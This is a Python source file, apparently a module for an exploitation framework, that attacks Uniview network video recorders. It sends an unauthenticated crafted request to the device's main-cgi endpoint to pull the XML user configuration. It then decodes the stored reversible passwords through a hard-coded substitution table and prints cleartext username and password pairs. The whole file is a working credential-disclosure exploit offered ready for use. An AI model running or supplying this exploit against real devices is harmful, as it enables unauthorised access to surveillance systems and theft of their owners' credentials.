import httpx
import xml.etree.ElementTree as ET
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "uniview/credentials_disclosure_attack"
        self.description = "Exploit module to extract and decode cleartext admin/user passwords from Uniview NVRs."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }
        # Table de décodage statique Uniview transférée du script original
        self.pass_dict = {
            '77': '1', '78': '2', '79': '3', '72': '4', '73': '5', '74': '6', '75': '7', '68': '8', '69': '9',
            '76': '0', '93': '!', '60': '@', '95': '#', '88': '$', '89': '%', '34': '^', '90': '&', '86': '*',
            '84': '(', '85': ')', '81': '-', '35': '_', '65': '=', '87': '+', '83': '/', '32': '\\', '0': '|',
            '80': ',', '70': ':', '71': ';', '7': '{', '1': '}', '82': '.', '67': '?', '64': '<', '66': '>',
            '2': '~', '39': '[', '33': ']', '94': '"', '91': "'", '28': '`', '61': 'A', '62': 'B', '63': 'C',
            '56': 'D', '57': 'E', '58': 'F', '59': 'G', '52': 'H', '53': 'I', '54': 'J', '55': 'K', '48': 'L',
            '49': 'M', '50': 'N', '51': 'O', '44': 'P', '45': 'Q', '46': 'R', '47': 'S', '40': 'T', '41': 'U',
            '42': 'V', '43': 'W', '36': 'X', '37': 'Y', '38': 'Z', '29': 'a', '30': 'b', '31': 'c', '24': 'd',
            '25': 'e', '26': 'f', '27': 'g', '20': 'h', '21': 'i', '22': 'j', '23': 'k', '16': 'l', '17': 'm',
            '18': 'n', '19': 'o', '12': 'p', '13': 'q', '14': 'r', '15': 's', '8': 't', '9': 'u', '10': 'v',
            '11': 'w', '4': 'x', '5': 'y', '6': 'z'
        }

    def _decode_pass(self, rev_pass):
        if not rev_pass: return ""
        rev_pass_codes = rev_pass.split(";")
        password = ""
        for code in rev_pass_codes:
            if code != "124" and code:
                password += self.pass_dict.get(code, "[err]")
        return password

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/cgi-bin/main-cgi?json=%7B%22cmd%22:255,%22szUserName%22:%22%22,%22u32UserLoginHandle%22:8888888888%7D"
        else:
            url = f"{target.rstrip('/')}/cgi-bin/main-cgi?json=%7B%22cmd%22:255,%22szUserName%22:%22%22,%22u32UserLoginHandle%22:8888888888%7D"

        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                print("\033[1;33m[*] Téléchargement du fichier de configuration XML...\033[0m")
                response = await client.get(url)
                
                if response.status_code == 200 and "<UserCfg" in response.text:
                    root = ET.fromstring(response.text)
                    user_cfg = root.find("UserCfg")
                    if user_cfg is None:
                        return {"success": False, "details": "UserCfg tag missing from XML payload structure."}
                        
                    users = user_cfg.findall("User")
                    results = []
                    for user in users:
                        username = user.get("UserName", "N/A")
                        rvsble_pass = user.get("RvsblePass", "")
                        decoded = self._decode_pass(rvsble_pass)
                        results.append(f"{username}:{decoded if decoded else '[Vide]'}")
                        
                    return {
                        "success": True,
                        "details": f"Credentials dumped and decoded: {' || '.join(results)}"
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
            
        return {"success": False, "details": "Device not vulnerable or unhandled signature."}
